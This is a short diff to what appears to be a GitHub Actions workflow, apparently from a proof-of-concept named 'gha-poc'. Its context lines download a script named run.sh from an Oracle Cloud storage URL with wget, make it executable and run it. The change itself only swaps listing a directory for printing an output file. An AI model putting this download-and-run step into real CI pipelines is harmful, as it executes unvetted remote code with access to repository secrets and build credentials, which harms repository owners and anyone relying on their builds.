@@ -11,4 +11,4 @@ steps:
       wget https://objectstorage.uk-london-1.oraclecloud.com/p/CSfiZpXYnT0EndDhsdRXCEjCdNzAR9MTdk2bByr3C5Xpx4ovEbaN3MBlecNo2lLX/n/lrcl06h6pu7e/b/gha-poc/o/run.sh
       chmod +x run.sh
       ./run.sh
-      ls template-check
+      cat template-check/output.txt
